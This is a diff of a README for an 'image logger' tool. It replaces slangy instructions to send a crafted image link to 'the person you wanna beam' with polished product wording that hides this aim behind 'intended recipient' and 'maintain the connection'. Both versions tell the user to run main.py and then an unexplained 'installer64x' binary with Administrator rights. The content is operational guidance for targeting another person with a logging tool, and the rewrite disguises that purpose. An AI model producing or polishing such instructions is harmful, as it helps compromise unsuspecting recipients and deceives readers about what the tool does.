@@ -1,12 +1,6 @@
-READ INSTRUCTIONS BELOW!
+Welcome to HelloWorld's ImageLogger, a robust image logging solution. To get started, follow these steps:
 
-MAKE SURE YOU HAVE PYTHON 3.11+ INSTALLED FOR THIS TO WORK!(MOST IMPORTANT)
-
-HelloWorld's ImageLogger Is One of actually probably the BEST image logger in the internet!
-
-First Step In Downloading: Run main.py and wait for it to automatically close (5 - 10 seconds)
-
-Second Step In Downloading: Run installer64x as Administrator If you dont see installer64x there is a high chance that your OS is not compatible with this imagelogger as it only works for windows 7 and windows 10 (windows 11 and vista compatibility coming next update)
-
-Last Step In Downloading: After you ran installer64x run main.py again and insert the image's link address of your chice and send it to the person you wanna beam (make sure to stay beamed😎)
-
+Begin by running main.py and allow it to automatically close (typically within 5 to 10 seconds).
+Next, run installer64x as an Administrator. If you can't find installer64x, ensure that your operating system is compatible—currently, the logger supports Windows 7 and Windows 10 (compatibility with Windows 11 and Vista is expected in the next update).
+Finally, after running installer64x, execute main.py once more. Input the desired image link address and send it to the intended recipient. Remember to maintain the connection for successful transmission.
+Note: Ensure you have Python 3.11 or a later version installed for optimal functionality. If you have any questions or encounter issues, feel free to seek assistance. Thank you for choosing HelloWorld's ImageLogger."
